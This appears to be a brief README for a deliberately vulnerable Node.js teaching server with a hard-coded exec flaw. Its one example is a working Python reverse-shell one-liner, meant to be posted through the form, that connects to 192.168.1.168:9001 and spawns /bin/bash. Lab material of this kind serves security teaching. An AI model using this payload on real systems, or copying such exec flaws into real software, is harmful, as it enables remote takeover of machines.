# Nodejs exec vulnerability website

This server is meant for educational purposes and not for deployment.

There is a vulnerability hard coded into the server. 



Posting form with message 

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.168",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
